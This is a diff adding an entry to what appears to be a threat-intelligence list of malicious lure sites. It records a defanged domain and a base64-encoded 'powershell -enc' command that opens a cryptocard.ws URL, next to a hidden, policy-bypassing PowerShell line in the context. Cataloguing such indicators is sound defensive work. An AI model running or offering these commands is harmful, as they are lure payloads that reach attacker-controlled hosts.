@@ -56,5 +56,15 @@ powershell -w hidden -ep bypass -c "Start-Process powershell -WindowStyle Hidden
 
 ----
 
+<img src="https://iad.microlink.io/I3bElIZyBbLzN2XxgBWqfAoPGF9AH9ddKl4R1yZ3CScA613Cjiho0IDaTW6oHPfGW4JKYtA1Zl6JYhIdK7umCw.png" width="100%">
+
+```
+hxxps[:]//grand-game[.]club/
+
+powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACcAaAB0AHQAcABzADoALwAvAGMAcgB5AHAAdABvAGMAYQByAGQALgB3AHMALwA/AHMAcgBjAD0AdwBpAG4AcgAnAA==
+```
+
+----
+
 - https://stevesec.com/?page_id=284
 - https://gist.github.com/adulau/6cf6f3e9c5bbd9106af8814d0a22f473
